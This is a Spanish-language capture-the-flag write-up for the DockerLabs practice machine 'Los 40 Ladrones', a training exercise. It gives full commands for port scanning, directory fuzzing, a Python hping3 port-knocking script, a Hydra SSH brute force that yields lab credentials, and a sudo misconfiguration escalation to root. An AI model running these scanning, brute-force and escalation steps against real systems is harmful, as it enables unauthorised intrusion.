# Informe de Pentesting – Máquina: **Los 40 Ladrones**

**Dificultad:** Fácil
**Objetivo:** Obtener acceso root a la máquina vulnerable

![Logo](/Los_40_Ladrones/Imagenes/Logo.png)

---

## Despliegue de la Máquina

Descargamos la máquina **Los 40 Ladrones** desde la página de DockerLabs y la descomprimimos usando el siguiente comando:

```bash
7z e los40ladrones.zip
```

Una vez descomprimido el archivo, desplegamos la máquina con:

```bash
sudo bash auto_deploy.sh los40ladrones.tar
```

![Inicio](/Los_40_Ladrones/Imagenes/inicio.jpeg)

---

## Verificación de Conectividad

Comprobamos que la máquina esté activa y accesible con un `ping`:

```bash
ping -c1 172.17.0.2
```

![Ping](/Los_40_Ladrones/Imagenes/ping.jpeg)

---

## Escaneo de Puertos

Usamos **nmap** para identificar los puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Extraemos los puertos encontrados con una herramienta personalizada:

```bash
extractPorts allPorts.txt
```

Luego ejecutamos un escaneo más detallado:

```bash
nmap -sC -sV -p 80 172.17.0.2 -oN target.txt
```

![Puerto](/Los_40_Ladrones/Imagenes/Puerto.jpeg)

---

## Enumeración Web

Accedemos al servicio HTTP en el puerto 80 y vemos la página por defecto de Apache2.

![Página Apache](/Los_40_Ladrones/Imagenes/pagina.jpeg)

Realizamos **fuzzing** para descubrir directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
```

Se descubren los directorios `/index.html` y `/qdefense.txt`.

![Gobuster](/Los_40_Ladrones/Imagenes/gobuster.jpeg)

---

## Recolección de Información

El archivo `/qdefense.txt` contiene lo que parece ser un nombre de usuario: **toctoc**.

![Usuario](/Los_40_Ladrones/Imagenes/usuario.jpeg)

---

## Análisis de Puertos Filtrados

Ejecutamos un escaneo puntual a los puertos 21 y 22:

```bash
nmap -p21,22 172.17.0.2
```

Confirmamos que estos puertos están **filtrados**.

![Filtrado](/Los_40_Ladrones/Imagenes/filtrado.jpeg)

---

## Simulación de Port Knocking

Creamos un script en Python para simular port knocking con **hping3**:

```python
import os
import time

ip = "172.17.0.2"
ports = [7000, 8000, 9000]

for port in ports:
    os.system(f"hping3 -S -p {port} -c 1 {ip} > /dev/null")
    time.sleep(1)
```

Le damos permisos de ejecución y lo corremos:

```bash
chmod +x abrir.py
python3 abrir.py
```

![Script](/Los_40_Ladrones/Imagenes/Scripts.jpeg)

Después del port knocking, el escaneo confirma que el puerto **22 (SSH)** ahora está abierto:

```bash
nmap -p21,22 172.17.0.2
```

---

## Ataque de Fuerza Bruta con Hydra

Usamos **Hydra** para descubrir la contraseña del usuario `toctoc`:

```bash
hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t50
```

Las credenciales encontradas fueron:

* **Usuario:** toctoc
* **Contraseña:** kittycat

![Hydra](/Los_40_Ladrones/Imagenes/Hydra.jpeg)

---

## Acceso por SSH

Conectamos vía SSH usando las credenciales obtenidas:

```bash
ssh toctoc@172.17.0.2
```

![SSH](/Los_40_Ladrones/Imagenes/SSh.jpeg)

---

## Escalada de Privilegios

Revisamos los permisos `sudo` con:

```bash
sudo -l
```

El resultado muestra que el usuario puede ejecutar sin contraseña los siguientes comandos:

```
(ALL : ALL) NOPASSWD: /opt/bash
(ALL : ALL) NOPASSWD: /ahora/noesta/function
```

Usamos el binario autorizado para escalar privilegios:

```bash
sudo /opt/bash
```

Con esto obtenemos acceso como **root**.

![Root](/Los_40_Ladrones/Imagenes/root.jpeg)

---

## Conclusión

La máquina **Los 40 Ladrones** permite practicar técnicas de:

* Enumeración web y fuzzing
* Port knocking
* Ataques de fuerza bruta sobre SSH
* Escalada de privilegios mediante `sudo` mal configurado
